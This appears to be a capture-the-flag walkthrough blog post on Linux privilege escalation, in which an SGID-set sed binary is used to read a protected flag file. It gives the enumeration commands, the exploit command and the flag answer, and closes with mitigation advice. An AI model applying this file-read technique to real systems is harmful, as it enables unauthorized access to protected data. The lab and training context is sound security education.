---
title: PTG Superid - Linux Privilege Escalation
date: 2026-07-30 12:00:00 +0000
categories: [Walkthroughs, Linux Escalation]
tags: [linux-privesc, sgid-abuse, Linux Escalation, pt-garage]
---

![Intro Banner](/assets/img/custom_banners/2026-07-30-ptg-superid_banner.png)

- **Box:** PTG Superid
- **Vulnerability:** SGID Abuse (`/usr/bin/sed`)
- **Flag:** `ctf{su!d_b!n4r!es_4r3_b4d_f0r_s3cur!ty}`

---

## 1. Initial Recon

We are given a username, an SSH key, and an endpoint to connect to:

```bash
ssh -i id_ecdsa user@35.184.207.253
```

## 2. Privilege Escalation Vector

Now we can enumerate the server. We will look for binaries with the Set-Group-ID (SGID) bit set specifically for the group `ctf`:

```bash
find / -group ctf 2>/dev/null
```

![Find Command Output](/assets/ptgarage/ptg_superid/img_2_1.png)

**Output:**
```text
/home/ctf
/home/ctf/.bash_logout
/home/ctf/.profile
/home/ctf/.bashrc
/home/ctf/flag
/usr/bin/sed
```

We can verify the permissions of `/usr/bin/sed`:

```bash
ls -al /usr/bin/sed
```

**Output:**
```text
-rwxr-sr-x 1 root ctf 121288 Dec 22  2018 /usr/bin/sed
```

The binary `sed` is marked as SGID (`-rwxr-sr-x`) with the group owner as `ctf`.

## 3. Exploitation

We can abuse this configuration to read the flag file, which is only readable by the user and group `ctf`. Since `sed` will execute with the group permissions of `ctf`, we can use it to read the file:

```bash
# Verify permissions on the flag
ls -al /home/ctf/flag
-r--r----- 1 root ctf 40 Jan 16 04:20 flag

# Attempting to read it directly fails
cat /home/ctf/flag
cat: flag: Permission denied

# Exploiting the SGID binary
sed '' /home/ctf/flag
```

![Flag Output](/assets/ptgarage/ptg_superid/img_3_1.png)

This successfully prints the flag:
```text
ctf{su!d_b!n4r!es_4r3_b4d_f0r_s3cur!ty}
```

## 4. Mitigation
- Remove the SGID bit from the `sed` binary unless absolutely required by the system design: `chmod -s /usr/bin/sed`.
- Ensure standard Unix utilities are not assigned SGID/SUID bits pointing to arbitrary user groups without thorough security review.
